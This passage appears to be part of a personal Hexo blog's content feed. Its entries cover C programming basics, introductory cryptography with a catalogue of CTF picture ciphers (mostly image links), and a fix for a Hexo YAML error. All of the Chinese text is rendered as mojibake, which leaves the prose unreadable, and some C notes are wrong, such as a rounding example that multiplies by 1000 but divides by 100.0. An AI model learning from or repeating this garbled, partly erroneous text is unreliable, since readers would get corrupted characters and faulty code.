        <content type="html"><![CDATA[<p>1.(ï¼flag) ç­‰ä»·äº (flag==0)<br>2.while(n)  æ˜¯ä»€ä¹ˆæ„æ€ï¼Ÿ<br>é¦–å…ˆï¼Œnåœ¨è¿™é‡Œè¢«å½“ä½œäº†ä¸€ä¸ªæ¡ä»¶<br>å…¶æ¬¡ï¼Œå½“nä¸ºçœŸæ—¶ï¼Œè¿›å…¥whileå¾ªç¯ä½“ï¼ˆAï¼‰ï¼›å¦åˆ™è·³å‡ºå¾ªç¯ç»§ç»­æ‰§è¡Œä¸‹é¢éƒ¨åˆ†ï¼ˆBï¼‰ã€‚<br>whileï¼ˆnï¼‰<br>ï½›<br>å¾ªç¯ä½“ï¼›//æ ‡è¯†ä¸ºA<br>ï½<br>è¯­å¥1ï¼›//æ ‡è¯†ä¸ºB<br>è¯­å¥2ï¼›<br>3.å¦‚ä½•ç”¨Cè¯­è¨€å°†å­—ç¬¦å‹æ•°å­—è½¬åŒ–æˆæ•°å€¼å‹æ•°å­—<br>â€˜2â€™       é€šè¿‡ïƒ      â€˜2â€™ - â€™0â€™ = 2<br>4.å¯¹äºäºŒç»´æ•°ç»„å¦‚ä½•å°†ä»€ä¹ˆä¸Šä¸‰è§’ã€ä¸‹ä¸‰è§’çš„å€¼è¿›è¡Œä¿®æ”¹<br>è€ƒè™‘å¯¹è§’çº¿å¾ˆé‡è¦<br>æ¯”å¦‚ 5 5 5 5 5<br>       5 5 5 5 5<br>       5 5 5 5 5<br>       5 5 5 5 5<br>       5 5 5 5 5<br>æ­£ä¸‰è§’çº¿ï¼šå·¦åˆ°å³ï¼Œi=j<br>åä¸‰è§’çº¿ï¼šå³åˆ°å·¦ï¼Œi+j=n-1<br>å–å¤§äºç­‰äºæˆ–è€…å°äºç­‰äºå·æ—¶å°±å¯ä»¥å®ç°ä¸Šä¸‰è§’ä¹‹ç±»çš„æ•°æ“ä½œ</p><p>1 å®šä¹‰è¯­å¥ã€æ‰§è¡Œè¯­å¥ä»¥åˆ†å· ï¼›ç»“å°¾</p><p>2 å¿…é¡»æœ‰ä¸»å‡½æ•°   mainï¼ˆï¼‰</p><p>3 æ ‡è¯†ç¬¦ç”±å­—æ¯ã€æ•°å­—å’Œä¸‹ç”»çº¿-ç»„æˆï¼Œ</p><p>ç¬¬ä¸€ä¸ªå­—ç¬¦å¿…é¡»æ˜¯å­—æ¯æˆ–ä¸‹ç”»çº¿</p><p>4 charå­—ç¬¦å‹                 å­—ç¬¦å‹æ•°æ®ï¼ˆcharï¼‰ï¼Œç”¨æ¥å‚¨å­˜å­—ç¬¦</p><p>â€‹                                       å‚¨å­˜å†…å®¹ä¸ºå­—ç¬¦å¯¹äºASCII ç </p><p>5 getchar æ˜¯ä»é”®ç›˜ç¼“å†²åŒºè·å–ä¸€ä¸ªå­—ç¬¦ï¼ˆè¾“å…¥å•ä¸ªå­—æ—¶ï¼‰</p><p>è€Œputcharæ˜¯æŠŠå‚æ•°æŒ‡å®šçš„å­—ç¬¦å˜é‡çš„å­—ç¬¦è¾“å‡ºï¼ˆè¾“å‡ºå•ä¸ªå­—ç¬¦ï¼‰</p><p>egï¼šchar chï¼›</p><p>â€‹         ch=getcharï¼ˆ): è¿è¡Œåˆ°è¿™é‡Œè¾“å…¥ä¸€ä¸ªå­—ç¬¦åå¿…é¡»å›è½¦ä¸€ä¸‹getcharæ‰è¿”å›</p><p>putchar ï¼ˆchï¼‰</p><p>8 å°æ•°å››èˆäº”å…¥  scanf ï¼ˆâ€%fâ€ï¼Œ&amp;aï¼‰</p><p>â€‹                             a=intï¼ˆa*1000+0.5ï¼‰/1000.0</p><p>â€‹                             printf(â€œ%0.3fâ€,a)</p><p>Cä¸­ä¿ç•™ä¸¤ä½å°æ•°</p><p>1ã€float a=3.456</p><p>â€‹      float b=(int)(a*1000+0.5)/100.0</p><p>2ã€float a=23,456789</p><p>â€‹      printf(â€œ%2fâ€,a);</p><p>9 scanf( )å¼æ ¼å¼è¾“å…¥å‡½æ•°</p><p>å®ƒä»æ ‡å‡†è¾“å…¥è®¾å¤‡(é”®ç›˜)è¯»å–è¾“å…¥çš„ä¿¡æ¯</p><p>10 double area</p><p>å»ºç«‹ä¸€ä¸ªç±»å‹ä¸ºåŒç²¾åº¦æµ®ç‚¹å°æ•°çš„å˜é‡ï¼Œè¿™ä¸ªå˜é‡çš„åç§°æ˜¯area</p><p>%5.2få«ä¹‰ï¼šè¾“å‡ºä¸€ä¸ªæµ®ç‚¹æ•°</p><p>æ ¼å¼ä¸ºå°æ•°ç‚¹å‰æœ€å¤šä¿ç•™5ä½æœ‰æ•ˆæ•°å­—</p><p>â€‹            å°æ•°ç‚¹åæœ€å¤šä¿ç•™2ä½æœ‰æ•ˆæ•°å­—</p><h4 id="åœ¨Cè¯­è¨€ä¸­ï¼Œèƒ½å¤Ÿè·å–å­—ç¬¦ä¸²çš„å‡½æ•°è‡³å°‘æœ‰ä¸¤ä¸ªï¼š"><a href="#åœ¨Cè¯­è¨€ä¸­ï¼Œèƒ½å¤Ÿè·å–å­—ç¬¦ä¸²çš„å‡½æ•°è‡³å°‘æœ‰ä¸¤ä¸ªï¼š" class="headerlink" title="åœ¨Cè¯­è¨€ä¸­ï¼Œèƒ½å¤Ÿè·å–å­—ç¬¦ä¸²çš„å‡½æ•°è‡³å°‘æœ‰ä¸¤ä¸ªï¼š"></a>åœ¨Cè¯­è¨€ä¸­ï¼Œèƒ½å¤Ÿè·å–å­—ç¬¦ä¸²çš„å‡½æ•°è‡³å°‘æœ‰ä¸¤ä¸ªï¼š</h4><p>1.scanf()</p><p>æ‰€åœ¨å¤´æ–‡ä»¶ï¼šstdio.h</p><p>è¯­æ³•ï¼šscanf(â€œæ ¼å¼æ§åˆ¶å­—ç¬¦ä¸²â€,å˜é‡åœ°å€åˆ—è¡¨);</p><p>æ¥å—å­—ç¬¦ä¸²æ—¶ï¼šscanf(â€œ%sâ€,å­—ç¬¦æ•°ç»„åæˆ–æŒ‡é’ˆ);</p><p>2.gets()</p><p>æ‰€åœ¨å¤´æ–‡ä»¶ï¼šstdio.h</p><p>è¯­æ³•ï¼šgets(å­—ç¬¦æ•°ç»„åæˆ–æŒ‡é’ˆ);</p><p>ä¸¤è€…åœ¨æ¥å—å­—ç¬¦ä¸²æ—¶ï¼š</p><p>1.ä¸åŒç‚¹ï¼š<br>getså¯ä»¥æ¥æ”¶ç©ºæ ¼ï¼›è€Œscanfé‡åˆ°ç©ºæ ¼ã€å›è½¦å’ŒTabé”®éƒ½ä¼šè®¤ä¸ºè¾“</p><p>å…¥ç»“æŸï¼Œæ‰€æœ‰å®ƒä¸èƒ½æ¥æ”¶ç©ºæ ¼ã€‚</p><p>2.ç›¸åŒç‚¹ï¼š</p><p>å­—ç¬¦ä¸²æ¥å—ç»“æŸåè‡ªåŠ¨åŠ â€™\0â€™ã€‚</p><h4 id="printfå’Œputsçš„åŒºåˆ«"><a href="#printfå’Œputsçš„åŒºåˆ«" class="headerlink" title="printfå’Œputsçš„åŒºåˆ«"></a>printfå’Œputsçš„åŒºåˆ«</h4><p>ç›¸åŒç‚¹ï¼š<br>ä¸¤è€…éƒ½å±äºstdio.hè¿™ä¸ªå¤´æ–‡ä»¶<br>éƒ½èƒ½è¾“å‡ºå­—ç¬¦ä¸²</p><p>ä¸åŒç‚¹ï¼š<br>putsï¼ˆï¼‰åœ¨è¾“å‡ºå­—ç¬¦ä¸²æ—¶ä¼šå°†â€™\0â€™è‡ªåŠ¨è½¬æ¢æˆâ€™\nâ€™è¿›è¡Œè¾“å‡ºï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œputsæ–¹æ³•è¾“å‡ºå®Œå­—ç¬¦ä¸²åä¼šè‡ªåŠ¨æ¢è¡Œã€‚</p><ul><li><h2 id><a href="#" class="headerlink" title></a></h2></li></ul><p> hexo new post æ–°å»ºæ–‡ç« </p><p>C ç¨‹åºä¸»è¦åŒ…æ‹¬ä»¥ä¸‹éƒ¨åˆ†ï¼š</p><ul><li><p>é¢„å¤„ç†å™¨æŒ‡ä»¤</p></li><li><p>å‡½æ•°</p></li><li><p>å˜é‡</p></li><li><p>è¯­å¥ &amp; è¡¨è¾¾å¼</p></li><li><p>æ³¨é‡Š</p><p>å˜é‡å…¶å®åªä¸è¿‡æ˜¯ç¨‹åºå¯æ“ä½œçš„å­˜å‚¨åŒºçš„åç§°</p><table><thead><tr><th>char</th><th>é€šå¸¸æ˜¯ä¸€ä¸ªå­—èŠ‚ï¼ˆå…«ä½ï¼‰ã€‚è¿™æ˜¯ä¸€ä¸ªæ•´æ•°ç±»å‹ã€‚</th></tr></thead><tbody><tr><td>int</td><td>å¯¹æœºå™¨è€Œè¨€ï¼Œæ•´æ•°çš„æœ€è‡ªç„¶çš„å¤§å°ã€‚</td></tr><tr><td>float</td><td>å•ç²¾åº¦æµ®ç‚¹å€¼ã€‚å•ç²¾åº¦æ˜¯è¿™æ ·çš„æ ¼å¼ï¼Œ1ä½ç¬¦å·ï¼Œ8ä½æŒ‡æ•°ï¼Œ23ä½å°æ•°ã€‚</td></tr><tr><td>double</td><td>åŒç²¾åº¦æµ®ç‚¹å€¼ã€‚åŒç²¾åº¦æ˜¯1ä½ç¬¦å·ï¼Œ11ä½æŒ‡æ•°ï¼Œ52ä½å°æ•°ã€‚</td></tr><tr><td>void</td><td>è¡¨ç¤ºç±»å‹çš„ç¼ºå¤±ã€‚</td></tr></tbody></table></li></ul><p>   C ç¨‹åºä¸­å¯ç”¨çš„å­˜å‚¨ç±»ï¼š</p><ul><li><p>auto</p></li><li><p>register</p></li><li><p>static</p></li><li><p>extern</p></li></ul><p>æ±‚ä½™ã€æ¨¡è¿ç®—ç¬¦ï¼ˆ%ï¼‰æ—¶baiè¦æ±‚ä¸¤æ•°å¿…é¡»æ˜¯æ•´å‹æ•°æ®ã€‚%å°±æ˜¯baiå–ä½™æ•°è¿ç®—,ä¹Ÿå°±æ˜¯æ¨¡è¿ç®—ï¼ˆmodï¼‰ã€‚</p><p>10/3åœ¨Cè¯­è¨€é‡Œæ˜¯æ•´é™¤çš„æ„æ€ï¼Œç»“æœæ˜¯3</p><p>10%3æ˜¯æ±‚ä½™ï¼Œç»“æœæ˜¯ä½™æ•°1</p><p>10.0/3ä¼šè½¬æ¢ä¸ºä¸¤ä¸ªdoubleå‹çš„æ•°ç›¸é™¤ï¼Œç­”æ¡ˆæ˜¯3.3333</p><p>   7%4çš„ç»“æœæ˜¯3<br>   -7%4çš„ç»“æœæ˜¯-3<br>   3%-4çš„ç»“æœæ˜¯3ï¼ˆ**<em>ç»“æœç¬¦å·ä¸è¢«é™¤æ•°ç›¸åŒ**</em>ï¼‰</p><p>ä»£ç è¾“å…¥æ—¶æ— éœ€ç‰¹æ„å¯¹é½ï¼Œæ³¨æ„ç¬¦å·å³å¯ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> c </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¯†ç å­¦</title>
      <link href="/2020/10/18/x/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
      <url>/2020/10/18/x/%E5%AF%86%E7%A0%81%E5%AD%A6/</url>
      
        <content type="html"><![CDATA[<p>å¯†ç ï¼šåŸºæœ¬æ€æƒ³  ä¼ªè£…</p><p>æ˜æ–‡ç©ºé—´M é›†åˆ</p><p>å¯†æ–‡ç©ºé—´C  é›†åˆ</p><p>å¯†é’¥ç©ºé—´K            Ke åŠ å¯†é’¥   Kd è§£å¯†é’¥</p><p>åŠ å¯†ç®—æ³•Eï¼šMâ€”&gt;C</p><p>è§£å¯†ç®—æ³•Dï¼šCâ€”-&gt;M   è€Œä¸”è§£å¯†å˜æ¢æ˜¯åŠ å¯†å˜æ¢çš„é€†è¿‡ç¨‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;img-blog.csdn.net&#x2F;20180831003945940?watermark&#x2F;2&#x2F;text&#x2F;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw&#x3D;&#x3D;&#x2F;font&#x2F;5a6L5L2T&#x2F;fontsize&#x2F;400&#x2F;fill&#x2F;I0JBQkFCMA&#x3D;&#x3D;&#x2F;dissolve&#x2F;70</span><br></pre></td></tr></table></figure><p>å…±æ¨¡<br>è®¾aï¼Œbä¸ºæ­£æ•´æ•°ï¼Œå¦‚æœç”¨måˆ†åˆ«é™¤å»aå’Œbæ‰€å¾—çš„ä½™æ•°ç›¸åŒï¼Œåˆ™ç§°aå’Œbå…³äºæ¨¡måŒä½™<br>è®°ä½œa=b<mod m><br>eg:1=27<mod26><br>(ä¸€ä¸ªæ•°é™¤ä»¥æ¯”å®ƒå¤§çš„æ•°ï¼Œä½™æ•°ä¸ºå®ƒæœ¬èº«ï¼‰</mod26></mod></p><p>å¯†ç å­¦äº†è§£ï¼š</p><p>1ã€<strong>å¯¹ç§°å¯†ç ç®—æ³•</strong></p><p>åŠ å¯†å¯†é’¥å’Œè§£å¯†å¯†é’¥ç›¸åŒï¼ˆæˆ–è€…å®è´¨ä¸Šç­‰åŒï¼Œå³ä»ä¸€ä¸ªæ˜“æ¨å‡ºå¦ä¸€ä¸ªï¼‰ï¼Œ</p><p>â€¢ DESã€3DESã€IDEAã€AES</p><p>2ã€<strong>éå¯¹ç§°å¯†ç ç®—æ³•</strong></p><p>åŠ å¯†å¯†é’¥å’Œè§£å¯†å¯†é’¥ä¸åŒï¼Œå…¶ä¸­çš„åŠ å¯†å¯†é’¥å¯ä»¥å…¬å¼€ï¼Œ ç§°ä¸ºå…¬å¼€å¯†é’¥ï¼Œç®€ç§°å…¬é’¥ï¼›è§£å¯†å¯†é’¥å¿…é¡»ä¿å¯†ï¼Œç§°ä¸ºç§äººå¯†é’¥ï¼Œ</p><p>â€¢ RSAã€ECCã€ElGamal</p><h3 id="3ã€ç¼–ç æ–¹å¼"><a href="#3ã€ç¼–ç æ–¹å¼" class="headerlink" title="3ã€ç¼–ç æ–¹å¼"></a>3ã€<strong>ç¼–ç æ–¹å¼</strong></h3><p>ASCIIç¼–ç ï¼šASCIIåœ¨çº¿è½¬æ¢åœ°å€ï¼š<a href="http://www.mokuge.com/tool/asciito16/">http://www.mokuge.com/tool/asciito16/</a></p><h4 id="baseå®¶æ—ç¼–ç "><a href="#baseå®¶æ—ç¼–ç " class="headerlink" title="baseå®¶æ—ç¼–ç "></a>baseå®¶æ—ç¼–ç </h4><ul><li>base2: 2è¿›åˆ¶</li><li>base10: 10è¿›åˆ¶</li><li>base16ï¼ˆHEX): è®¡ç®—æœºå­—èŠ‚è¡¨ç¤ºï¼Œ0<del>9ï¼ŒA</del>Fï¼Œ16ä½ç»„æˆ</li><li>base32: å­—æ¯åŠ æ•°å­—ï¼Œå¤§å†™å­—æ¯ï¼Œ234567,32ä½ç»„æˆ</li><li>base64: æ›´å¤§çš„è¡¨ç¤ºèŒƒå›´,å¤§å°å†™å­—æ¯ï¼Œ0~9ï¼Œ+ï¼Œ-,64ä½ç»„æˆçš„ã€‚(åšé¢˜æ—¶ç»å¸¸æ˜æ˜¾çš„ç­‰å·==)</li><li>base58: bitcoinä¸ºäº†æ¯”base64æ›´æ˜“è¯»é‡‡ç”¨çš„è¡¨ç¤º</li></ul><p>å…·ä½“å®ç°å¯ä»¥åˆ†ä¸º2ç§ï¼Œèƒ½åˆ©ç”¨bitä½ç›´æ¥è½¬æ¢çš„base(ä¾‹å¦‚base2, base16,base32, base64),å’Œä¸èƒ½åˆ©ç”¨bitä½ç›´æ¥è½¬æ¢çš„base(ä¾‹å¦‚base10, base58)ã€‚</p><p><img src="/2020/10/18/x/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(182).png"></p><p>å…³äºbase16ï¼Œ32ï¼Œ64çš„æ–‡ç« ï¼š<a href="https://blog.csdn.net/lili13897741554/article/details/82177472">https://blog.csdn.net/lili13897741554/article/details/82177472</a></p><h4 id="miscçš„å›¾å½¢å¯†ç "><a href="#miscçš„å›¾å½¢å¯†ç " class="headerlink" title="miscçš„å›¾å½¢å¯†ç "></a>miscçš„å›¾å½¢å¯†ç </h4><p>ï¼ˆä¹Ÿæ˜¯æœ‰å…³å¯†ç å°±è®°å½•åœ¨è¿™é‡Œäº†ï¼‰</p><h5 id="1-çŒªåœˆå¯†ç "><a href="#1-çŒªåœˆå¯†ç " class="headerlink" title="1.çŒªåœˆå¯†ç "></a>1.çŒªåœˆå¯†ç </h5><p>è¿™ä¸ªåº”è¯¥å¾ˆå¸¸è§äº†ï¼ˆå½“ç„¶è¿˜åŒ…æ‹¬å¾ˆå¤šå˜å½¢</p><p><img src="https://img-blog.csdnimg.cn/2020121317155637.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FtaGVyc3RpZWFl,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h5 id="2-åœ£å ‚æ­¦å£«å¯†ç -çŒªåœˆå˜å½¢1"><a href="#2-åœ£å ‚æ­¦å£«å¯†ç -çŒªåœˆå˜å½¢1" class="headerlink" title="2.åœ£å ‚æ­¦å£«å¯†ç -çŒªåœˆå˜å½¢1"></a>2.åœ£å ‚æ­¦å£«å¯†ç -çŒªåœˆå˜å½¢1</h5><p><img src="https://img-blog.csdnimg.cn/20201213171645589.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FtaGVyc3RpZWFl,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h5 id="3-çŒªåœˆå˜å½¢2"><a href="#3-çŒªåœˆå˜å½¢2" class="headerlink" title="3.çŒªåœˆå˜å½¢2"></a>3.çŒªåœˆå˜å½¢2</h5><p><img src="https://img-blog.csdnimg.cn/20201213171716955.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FtaGVyc3RpZWFl,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h5 id="4-çŒªåœˆå˜å½¢4"><a href="#4-çŒªåœˆå˜å½¢4" class="headerlink" title="4.çŒªåœˆå˜å½¢4"></a>4.çŒªåœˆå˜å½¢4</h5><p><img src="https://img-blog.csdnimg.cn/20201213171957838.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FtaGVyc3RpZWFl,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h5 id="5-å®‡å®™çš„ä¿¡å·"><a href="#5-å®‡å®™çš„ä¿¡å·" class="headerlink" title="5.å®‡å®™çš„ä¿¡å·"></a>5.å®‡å®™çš„ä¿¡å·</h5><p><img src="https://img-blog.csdnimg.cn/20201213172025785.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FtaGVyc3RpZWFl,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h5 id="6-ç¦å°”æ‘©æ–¯è·³èˆçš„å°äºº"><a href="#6-ç¦å°”æ‘©æ–¯è·³èˆçš„å°äºº" class="headerlink" title="6.ç¦å°”æ‘©æ–¯è·³èˆçš„å°äºº"></a>6.ç¦å°”æ‘©æ–¯è·³èˆçš„å°äºº</h5><p>æœ‰æ‹¿æ——å­å’Œä¸æ‹¿æ——å­ä¸¤ç§</p><p><img src="https://img-blog.csdnimg.cn/20201213172051787.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FtaGVyc3RpZWFl,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h5 id="7-a-zæ˜¯é¡ºåºæ¥çš„"><a href="#7-a-zæ˜¯é¡ºåºæ¥çš„" class="headerlink" title="7.a-zæ˜¯é¡ºåºæ¥çš„"></a>7.a-zæ˜¯é¡ºåºæ¥çš„</h5><p><img src="https://img-blog.csdnimg.cn/20201213172133298.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FtaGVyc3RpZWFl,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h5 id="8-å¤åŸƒåŠè±¡å½¢æ–‡å­—"><a href="#8-å¤åŸƒåŠè±¡å½¢æ–‡å­—" class="headerlink" title="8.å¤åŸƒåŠè±¡å½¢æ–‡å­—"></a>8.å¤åŸƒåŠè±¡å½¢æ–‡å­—</h5><p><img src="https://img-blog.csdnimg.cn/20201213172239642.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FtaGVyc3RpZWFl,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h5 id="9-å¤ç²¾çµè¯­"><a href="#9-å¤ç²¾çµè¯­" class="headerlink" title="9.å¤ç²¾çµè¯­"></a>9.å¤ç²¾çµè¯­</h5><p>å­—æ¯<br>æ•°å­—</p><p><img src="https://img-blog.csdnimg.cn/20201213172259135.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FtaGVyc3RpZWFl,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h5 id="10-ç¥å¥‡å®è´é¸Ÿå›¾è…¾"><a href="#10-ç¥å¥‡å®è´é¸Ÿå›¾è…¾" class="headerlink" title="10.ç¥å¥‡å®è´é¸Ÿå›¾è…¾"></a>10.ç¥å¥‡å®è´é¸Ÿå›¾è…¾</h5><p><img src="https://img-blog.csdnimg.cn/20201213172434844.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FtaGVyc3RpZWFl,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h5 id="11-é˜¿é›·è¥¿åšå°„ç”µæœ›è¿œé•œç”¨äºŒè¿›åˆ¶è¡¨ç¤º1-10æ•°å­—"><a href="#11-é˜¿é›·è¥¿åšå°„ç”µæœ›è¿œé•œç”¨äºŒè¿›åˆ¶è¡¨ç¤º1-10æ•°å­—" class="headerlink" title="11.é˜¿é›·è¥¿åšå°„ç”µæœ›è¿œé•œç”¨äºŒè¿›åˆ¶è¡¨ç¤º1-10æ•°å­—"></a>11.é˜¿é›·è¥¿åšå°„ç”µæœ›è¿œé•œç”¨äºŒè¿›åˆ¶è¡¨ç¤º1-10æ•°å­—</h5><p><img src="https://img-blog.csdnimg.cn/20201213172805434.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h5 id="12-ç›²æ–‡"><a href="#12-ç›²æ–‡" class="headerlink" title="12.ç›²æ–‡"></a>12.ç›²æ–‡</h5><p>è¿™é‡Œåªæœ‰è‹±æ–‡å­—æ¯å’Œæ•°å­—ï¼Œå½“ç„¶å£°æ¯éŸµæ¯å£°è°ƒç­‰è¿˜æ˜¯ ä¸ä¸€æ ·çš„ã€‚</p><p><img src="https://img-blog.csdnimg.cn/20201213172831531.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FtaGVyc3RpZWFl,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p><img src="https://img-blog.csdnimg.cn/2020121317322193.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h5 id="13-éŸ³ç¬¦åŠ å¯†"><a href="#13-éŸ³ç¬¦åŠ å¯†" class="headerlink" title="13.éŸ³ç¬¦åŠ å¯†"></a>13.éŸ³ç¬¦åŠ å¯†</h5><p><img src="https://img-blog.csdnimg.cn/20201213173240570.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FtaGVyc3RpZWFl,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p><img src="https://img-blog.csdnimg.cn/20201213173240509.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FtaGVyc3RpZWFl,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p><img src="https://img-blog.csdnimg.cn/20201213173240489.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FtaGVyc3RpZWFl,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h5 id="14-å¤©å¹²åœ°æ”¯"><a href="#14-å¤©å¹²åœ°æ”¯" class="headerlink" title="14.å¤©å¹²åœ°æ”¯"></a>14.å¤©å¹²åœ°æ”¯</h5><p><img src="https://img-blog.csdnimg.cn/20201213173309635.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FtaGVyc3RpZWFl,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h5 id="15-æœç‹—è½¯é”®ç›˜"><a href="#15-æœç‹—è½¯é”®ç›˜" class="headerlink" title="15.æœç‹—è½¯é”®ç›˜"></a>15.æœç‹—è½¯é”®ç›˜</h5><p><img src="https://img-blog.csdnimg.cn/20210112163836195.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FtaGVyc3RpZWFl,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>åŸæ–‡é“¾æ¥ï¼š<a href="https://blog.csdn.net/Amherstieae/article/details/111134283">https://blog.csdn.net/Amherstieae/article/details/111134283</a></p><h5 id="æ˜Ÿåº§å¯†ç "><a href="#æ˜Ÿåº§å¯†ç " class="headerlink" title="æ˜Ÿåº§å¯†ç "></a>æ˜Ÿåº§å¯†ç </h5><p><img src="/2020/10/18/x/%E5%AF%86%E7%A0%81%E5%AD%A6/image-20210531213925718.png" alt="image-20210531213925718"></p>]]></content>
      
      
      
        <tags>
            
            <tag> cryptography </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åšå®¢è§£ç–‘</title>
      <link href="/2020/10/15/x/%E5%8D%9A%E5%AE%A2%E8%A7%A3%E7%96%91/"/>
      <url>/2020/10/15/x/%E5%8D%9A%E5%AE%A2%E8%A7%A3%E7%96%91/</url>
      
        <content type="html"><![CDATA[<h3 id="å½“è¾“å…¥hexo-gå‘å¸ƒåšæ–‡å¹¶é¢„è§ˆæ—¶å‡ºç°ä¸‹é¢çš„æç¤ºï¼š"><a href="#å½“è¾“å…¥hexo-gå‘å¸ƒåšæ–‡å¹¶é¢„è§ˆæ—¶å‡ºç°ä¸‹é¢çš„æç¤ºï¼š" class="headerlink" title="å½“è¾“å…¥hexo -gå‘å¸ƒåšæ–‡å¹¶é¢„è§ˆæ—¶å‡ºç°ä¸‹é¢çš„æç¤ºï¼š"></a>å½“è¾“å…¥hexo -gå‘å¸ƒåšæ–‡å¹¶é¢„è§ˆæ—¶å‡ºç°ä¸‹é¢çš„æç¤ºï¼š</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">YAMLException: can not read a block mapping entry; a multiline key may not be an implicit key at line x, column y:</span><br><span class="line">1</span><br></pre></td></tr></table></figure><p>æŠ¥é”™ä¿¡æ¯æ˜¯æç¤ºhexoçš„ymlé…ç½®æ–‡ä»¶ å†’å·åé¢å°‘äº†ç©ºæ ¼ è§£å†³æ–¹æ¡ˆï¼šåˆ°æç¤ºè¡Œå°†å¯¹åº”çš„ç©ºæ ¼è¡¥ä¸Šå³å¯ã€‚</p><h4 id="è¡¥å……ï¼š"><a href="#è¡¥å……ï¼š" class="headerlink" title="è¡¥å……ï¼š"></a>è¡¥å……ï¼š</h4><p>å¦‚æœæ ‡é¢˜ç”¨è¯¸å¦‚[ç½‘é¼æ¯] 2020 é’é¾™ç»„AreUSerialzçš„æ—¶å€™ï¼Œä¼šå‡ºç°æŠ¥é”™</p><p>åŸå› çŒœæµ‹ä¸ºhexoæ 